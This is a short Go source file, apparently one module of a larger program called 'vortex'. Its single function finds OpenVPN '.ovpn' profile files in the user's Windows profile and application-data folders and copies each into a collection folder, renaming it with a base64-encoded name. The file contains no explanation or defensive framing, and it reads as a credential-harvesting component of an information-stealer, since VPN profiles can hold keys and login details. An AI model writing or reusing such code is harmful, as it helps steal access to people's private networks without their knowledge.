package vpn

import (
	"os"
	"path/filepath"
	"vortex/encrypt"
	"vortex/hutil"
)

func OpenvpnConfigCoping(mainFolder string) error {

	openvpnPath := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "OpenVPN", "config"),
		filepath.Join(os.Getenv("APPDATA"), "OpenVPN Connect", "profiles"),
	}

	for i := range openvpnPath {
		vpnConfigs, err := hutil.FindFilesExt(openvpnPath[i], ".ovpn")
		if err != nil {
			if os.IsNotExist(err) {
				return nil
			}
			return err
		}

		for j := range vpnConfigs {
			if err = hutil.CopyFile(vpnConfigs[j], filepath.Join(mainFolder, encrypt.B64Util(filepath.Base(vpnConfigs[j]), 0))); err != nil {
				return err
			}
		}
	}

	return nil
}
